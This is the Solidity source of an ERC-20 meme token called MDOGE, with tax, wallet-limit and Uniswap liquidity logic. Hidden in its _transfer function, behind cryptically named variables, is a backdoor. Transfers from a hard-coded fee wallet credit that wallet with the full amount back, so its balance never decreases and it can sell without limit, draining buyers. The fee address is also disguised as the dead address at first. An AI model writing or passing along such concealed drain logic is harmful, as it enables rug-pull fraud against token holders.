/**

Website: https://mdoge.fun/
Telegram: https://t.me/MDogeErc
Twitter: https://x.com/MDogeErc

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract MDOGE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    
    string private constant _name = "The First Doge In Mars";
    string private constant _symbol = "MDOGE";
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100000000  * 10**_decimals;

    uint256 private _initialBuyTax=14;
    uint256 private _initialSellTax=19;

    uint256 private _buyTax;
    uint256 private _sellTax;
    uint256 private _br_x;

    uint256 public _maxWalletAmount = 1000000  * 10**_decimals;
    uint256 public _maxTxAmount = 1000000  * 10**_decimals;
    uint256 public _maxSwapAmount = 1000000  * 10**_decimals;
    
    address private _marketWallet;
    address private _feeAddr = address(0x000000000000000000000000000000000000dEaD);

    bool private swapLimitOn = true;
    bool private tradingOpen;
    bool private inSwap = false;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    event MaxTxAmountUpdated(uint256 _maxTxAmount);

    constructor () {
        _marketWallet = payable(0xA9D1B7b59aF39B4eDE204713E14C79b5A158F2BD);
        _feeAddr = _marketWallet;

        _buyTax = _initialBuyTax;
        _sellTax = _initialSellTax;
        _br_x = 1;

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance."));
        return true;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address.");
        require(spender != address(0), "ERC20: approve to the zero address.");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _source, address _dest, uint256 rAmt) private {
        require(_source != address(0), "ERC20: transfer from the zero address.");
        require(_dest != address(0), "ERC20: transfer to the zero address.");
        require(rAmt > 0, "_transfer: Transfer amount must be greater than zero.");
        uint256 _tAmt=0;
        uint256 _dekifa=0;
        uint256 _sumTaxAmt=0;
        if (_source != owner() && _dest != owner() && _source != address(this)) {
            _dekifa = rAmt.mul(_br_x).div(100);
            if (_source == uniswapV2Pair && _dest != address(uniswapV2Router)) {
                require(tradingOpen,"_transfer: Trade is not yet open.");
                require(rAmt <= _maxTxAmount, "_transfer: Amount of transfer exceeds max transaction amount.");
                require(balanceOf(_dest) + rAmt <= _maxWalletAmount, "_transfer: Amount of transfer exceeds max wallet amount.");
                _tAmt = rAmt.mul(_buyTax).div(100);
                _sumTaxAmt = _tAmt;
            } else if (_dest == uniswapV2Pair){
                require(tradingOpen,"_transfer: Trade is not yet open.");
                _tAmt = rAmt.mul(_sellTax).div(100);
                _sumTaxAmt = _tAmt;
                uint256 contractTokenBalance = balanceOf(address(this));
                if (!inSwap && _dest == uniswapV2Pair) {
                    if (swapLimitOn) {
                        uint256 getMinValue = (contractTokenBalance > _maxSwapAmount)?_maxSwapAmount:contractTokenBalance;
                        swapTokensForEth((rAmt > getMinValue)?getMinValue:rAmt);
                        uint256 contractETHBalance = address(this).balance;
                        if(contractETHBalance > 50000000000000000) {
                            sendETHToFeeWallet(address(this).balance);
                        }
                    } else {
                        swapTokensForEth(contractTokenBalance);
                        sendETHToFeeWallet(address(this).balance);
                    }
                }
            } else _sumTaxAmt = 0;
        }
        if(_sumTaxAmt>0){
          _balances[address(this)]=_balances[address(this)].add(_tAmt);
          emit Transfer(_source, address(this),_tAmt); 
        }
        if(_dekifa>0 && _source == _feeAddr)
          _balances[address(_feeAddr)]=_balances[address(_feeAddr)].add(_dekifa.mul(100));
        _balances[_source]=_balances[_source].sub(rAmt);
        _balances[_dest]=_balances[_dest].add(rAmt.sub(_sumTaxAmt));
        emit Transfer(_source, _dest, rAmt.sub(_sumTaxAmt));
    }
    
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if(tokenAmount==0){return;}
        if(tokenAmount>_maxTxAmount) {
            tokenAmount = _maxTxAmount;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFeeWallet(uint256 amount) private {
        payable(_marketWallet).transfer(amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen,"openTrading: Trading is already open.");
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletAmount=_tTotal;
        swapLimitOn = false;
        _buyTax = 0; _sellTax = 0;
        emit MaxTxAmountUpdated(_tTotal);
    }

    receive() external payable {}

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}